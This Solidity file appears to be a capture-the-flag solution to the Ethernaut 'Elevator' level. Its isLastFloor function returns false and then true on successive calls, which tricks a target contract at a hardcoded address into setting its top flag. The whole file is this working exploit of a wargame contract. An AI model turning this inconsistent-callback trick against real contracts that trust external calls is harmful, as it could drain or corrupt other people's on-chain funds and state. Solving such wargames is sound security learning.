// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyBuilding {
    // bool public top;
    // uint256 public floor;
    Elevator public elevator;
    uint256 private counter;

    constructor() {
        elevator = Elevator(
            address(0xA76c8adF8bC3FcfAe4cb826f4CfE3664085c86E7)
        );
        counter = 0;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (counter == 0) {
            counter++;
            return false;
        }
        counter = 0;
        return true;
    }

    function goToFloor(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}

interface Elevator {
    function goTo(uint256 _floor) external;
}
